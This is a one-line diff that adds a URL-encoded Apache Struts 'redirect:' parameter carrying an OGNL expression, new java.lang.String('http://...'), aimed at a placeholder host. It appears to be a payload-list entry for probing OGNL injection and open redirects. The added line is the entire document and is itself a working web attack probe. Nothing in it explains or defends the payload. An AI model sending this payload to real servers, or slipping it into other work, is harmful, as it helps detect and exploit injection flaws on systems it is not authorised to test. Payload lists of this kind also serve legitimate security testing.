@@ -1,0 +1,1 @@
+redirect:%25{new%20java.lang.String(&apos;http://xxxxxxxxxxxxx&apos;)}
